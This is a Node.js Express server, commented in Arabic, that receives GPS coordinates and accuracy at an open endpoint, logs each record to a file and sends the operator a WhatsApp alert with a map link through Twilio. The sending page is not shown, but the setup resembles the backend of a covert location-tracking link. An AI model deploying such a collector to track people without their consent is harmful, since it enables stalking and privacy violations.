const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');
const twilio = require('twilio');

const app = express();
app.use(bodyParser.json());
app.use(cors());

// بيانات Twilio
const accountSid = 'YOUR_TWILIO_ACCOUNT_SID';
const authToken = 'YOUR_TWILIO_AUTH_TOKEN';
const twilioClient = new twilio(accountSid, authToken);
const twilioWhatsAppNumber = 'whatsapp:+14155238886';  // رقم Twilio
const yourWhatsAppNumber = 'whatsapp:+YOUR_PHONE_NUMBER';  // رقمك

app.post('/submit-location', (req, res) => {
    const locationData = req.body;
    console.log('تم استقبال الموقع:', locationData);

    fs.appendFileSync('locations.json', JSON.stringify(locationData) + '\n');

    // إرسال إشعار واتساب
    const message = `📍 موقع جديد:\n🌍 https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}\n🎯 الدقة: ${locationData.accuracy} متر`;
    
    twilioClient.messages.create({
        from: twilioWhatsAppNumber,
        to: yourWhatsAppNumber,
        body: message
    }).then(msg => console.log('تم إرسال الإشعار:', msg.sid))
      .catch(error => console.error('خطأ في الإرسال:', error));

    res.json({ message: 'تم استلام الموقع بنجاح' });
});

app.listen(3000, () => {
    console.log('الخادم يعمل على البورت 3000');
});